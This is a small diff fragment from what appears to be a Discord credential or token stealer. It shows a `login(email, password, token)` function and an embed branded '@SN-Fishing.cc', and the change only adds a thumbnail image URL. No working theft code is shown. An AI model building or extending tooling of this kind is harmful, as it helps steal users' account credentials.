@@ -653,7 +653,7 @@ const login = async (email, password, token) => {
           text: "@SN-Fishing.cc 🐟",
         },
         thumbnail: {
-          url: '',
+          url: 'https://cdn.discordapp.com/attachments/985538825151459341/987097007774654614/2e79085df912c93156b05504759adb5b-1.png',
         },
       },
     ],
